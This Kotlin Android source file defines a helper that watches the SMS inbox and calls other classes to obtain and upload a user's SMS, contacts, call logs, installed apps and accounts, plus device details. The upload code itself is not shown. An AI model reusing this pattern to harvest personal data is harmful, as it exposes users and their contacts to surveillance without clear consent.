package com.x.leo.apphelper.trace

import android.app.Activity
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import com.x.leo.apphelper.log.xlog.XLog
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject


/**
 * @作者:XLEO
 * @创建日期: 2017/9/4 16:55
 * @描述:${TODO}
 *
 * @更新者:${Author}$
 * @更新时间:${Date}$
 * @更新描述:${TODO}
 * @下一步：
 */
object TraceInfoGenerator {

    var registed:Boolean = false
    val observer:ContentObserver by lazy {
        object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                XLog.d(uri.toString(),100)
            }
        }
    }
    @Synchronized fun registerObserver(act: Activity) {
        if (registed) {
            return
        }
        act.applicationContext.contentResolver.registerContentObserver(Uri.parse("content://sms/inbox"), true, observer)
        registed = true
    }

    @Synchronized fun unRegisterObserver(act: Activity){
        if (registed) {
            act.applicationContext.contentResolver.unregisterContentObserver(observer)
            registed = false
        }
    }
    @Synchronized fun ObtainAndSendSms(mActivity: Activity) {
        SmsTraceManager.ObtainAndSendSms(mActivity)
    }

    @Synchronized fun ObtainAndSendContact(act:Activity){
       ContactTraceManager.uplodMessage(act)
   }

    /**
     * Get the machine type

     * @param mActivity
     * *
     * @return
     */
    fun getMachineType(mActivity: Activity): JSONObject {
        XLog.d("begin get machine type ->",10)

        val machineTypeEntity = JSONObject()
        val totalNumber = 1L
        val latestTime = 0L
        val earliestTime = 0L

        val machineTypeArray = JSONArray()

        val machineType = JSONObject()
        try {
            machineType.put("deviceBrand", Build.BRAND)
            machineType.put("deviceType", Build.MODEL)
            machineType.put("systemVersion", Build.VERSION.RELEASE)
            machineTypeArray.put(machineType)
        } catch (e: JSONException) {
            e.printStackTrace()
        }

        try {
            val packageInfo = mActivity.packageManager.getPackageInfo(mActivity.packageName, 0)
            machineTypeEntity.put("protocolName", ProtocolName.MACHINE_TYPE)
            machineTypeEntity.put("protocolVersion", ProtocolVersion.V_1_0)
            machineTypeEntity.put("versionName", packageInfo.versionName)

            machineTypeEntity.put("totalNumber", totalNumber)
            machineTypeEntity.put("latestTime", latestTime)
            machineTypeEntity.put("earliestTime", earliestTime)
            machineTypeEntity.put("data", machineTypeArray)
        } catch (ex: JSONException) {
            XLog.d("JSONException: " + ex.message,10)
            ex.printStackTrace()
        } catch (e: PackageManager.NameNotFoundException) {
            e.printStackTrace()
            XLog.d("PackageManager.NameNotFoundException: " + e.message,10)
        }

        XLog.d(machineTypeEntity.toString(),10)
        return machineTypeEntity
    }

    @Synchronized fun ObtainAndSendCallLog(act: Activity) {
        CallLogTraceManager.obtainAndUpload(act)
    }

    @Synchronized fun ObtainAndSendInatallApp(act: Activity) {
        InstalledAppTraceManager.obtainAndUpload(act)
    }

    @Synchronized fun obtainAndSendAccounts(act: Activity) {
        AccountTraceManager.getAccountList(act)
    }


}